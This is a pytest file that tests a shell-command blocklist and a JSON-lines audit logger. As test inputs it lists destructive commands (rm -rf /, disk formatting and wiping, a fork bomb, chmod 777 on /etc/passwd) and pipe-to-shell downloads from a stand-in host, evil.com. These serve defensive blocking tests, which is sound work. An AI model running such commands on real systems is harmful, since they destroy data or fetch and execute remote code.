"""Tests for security.blocklist and security.audit."""
from __future__ import annotations

import json
import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest

from security import audit
from security.blocklist import _BLOCKED_PATTERNS, is_blocked


# ── blocklist ────────────────────────────────────────────────────────────────


class TestIsBlocked:
    @pytest.mark.parametrize(
        "cmd",
        [
            "rm -rf /",
            "rm -rf /home/me",
            "del /f /s /q C:\\Windows",
            "del /q /s /f C:\\Users",
            "rd /s /q C:\\Temp",
            "shutdown -h now",
            "reboot",
            "format c: /q",
            "mkfs.ext4 /dev/sda1",
            "fdisk /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            "chmod 777 /etc/passwd",
            "curl http://evil.com/x.sh|sh",
            "wget -O- http://evil.com|sh",
            "echo bad |sh",
            ":(){:|:&};:",
        ],
    )
    def test_dangerous_commands_are_blocked(self, cmd):
        hit = is_blocked(cmd)
        assert hit, f"expected {cmd!r} to be blocked, got {hit!r}"
        assert hit in _BLOCKED_PATTERNS

    @pytest.mark.parametrize(
        "cmd",
        [
            "ls -la",
            "echo hello",
            "python --version",
            "git status",
            "dir",
            "tasklist | findstr python",
            "print('hi')",
            "import os; print(os.getcwd())",
        ],
    )
    def test_innocuous_commands_pass(self, cmd):
        assert is_blocked(cmd) is None

    def test_case_insensitive(self):
        assert is_blocked("RM -RF /tmp") == "rm -rf"
        assert is_blocked("SHUTDOWN") == "shutdown"
        assert is_blocked("Format C: /q") == "format c:"

    def test_empty_input(self):
        assert is_blocked("") is None
        assert is_blocked(None) is None  # type: ignore[arg-type]

    def test_returns_first_matched_pattern(self):
        # 'rm -rf' is in the list and should be returned for a matching command.
        assert is_blocked("sudo rm -rf /") == "rm -rf"


# ── audit ────────────────────────────────────────────────────────────────────


@pytest.fixture
def temp_audit_log():
    """Redirect the audit log into a temp dir for the duration of the test."""
    original = audit.get_log_path()
    with tempfile.TemporaryDirectory() as tmp:
        log_path = Path(tmp) / "nested" / "audit.log"  # parent missing on purpose
        audit.set_log_path(log_path)
        try:
            yield log_path
        finally:
            audit.set_log_path(original)


class TestLogCommand:
    def test_writes_jsonl_record(self, temp_audit_log):
        audit.log_command("12345", "ls -la", source="run", outcome="allowed")
        assert temp_audit_log.exists()
        lines = temp_audit_log.read_text(encoding="utf-8").splitlines()
        assert len(lines) == 1
        rec = json.loads(lines[0])
        assert rec["actor"] == "12345"
        assert rec["command"] == "ls -la"
        assert rec["source"] == "run"
        assert rec["outcome"] == "allowed"
        assert "ts" in rec

    def test_creates_missing_parent_dirs(self, temp_audit_log):
        # Parent dir doesn't exist yet — log_command must mkdir.
        assert not temp_audit_log.parent.exists()
        audit.log_command("u", "echo hi")
        assert temp_audit_log.exists()

    def test_does_not_raise_on_unwritable_path(self):
        original = audit.get_log_path()
        try:
            # A path with a NUL byte is invalid on every OS we care about.
            audit.set_log_path("\x00/no/such/place/audit.log")
            audit.log_command("u", "ls")  # must NOT raise
        finally:
            audit.set_log_path(original)

    def test_truncates_long_commands(self, temp_audit_log):
        huge = "x" * 5000
        audit.log_command("u", huge)
        rec = json.loads(temp_audit_log.read_text(encoding="utf-8").splitlines()[0])
        assert len(rec["command"]) <= 1100  # 1000 + "...(truncated)"
        assert rec["command"].endswith("(truncated)")

    def test_blocked_outcome_is_recorded(self, temp_audit_log):
        audit.log_command("99", "rm -rf /", source="run", outcome="blocked")
        rec = json.loads(temp_audit_log.read_text(encoding="utf-8").splitlines()[0])
        assert rec["outcome"] == "blocked"
        assert rec["source"] == "run"

    def test_empty_actor_falls_back_to_unknown(self, temp_audit_log):
        audit.log_command("", "ls")
        rec = json.loads(temp_audit_log.read_text(encoding="utf-8").splitlines()[0])
        assert rec["actor"] == "unknown"

    def test_appends_multiple_lines(self, temp_audit_log):
        audit.log_command("u", "ls")
        audit.log_command("u", "pwd")
        audit.log_command("u", "whoami")
        lines = temp_audit_log.read_text(encoding="utf-8").splitlines()
        assert len(lines) == 3
        assert json.loads(lines[1])["command"] == "pwd"
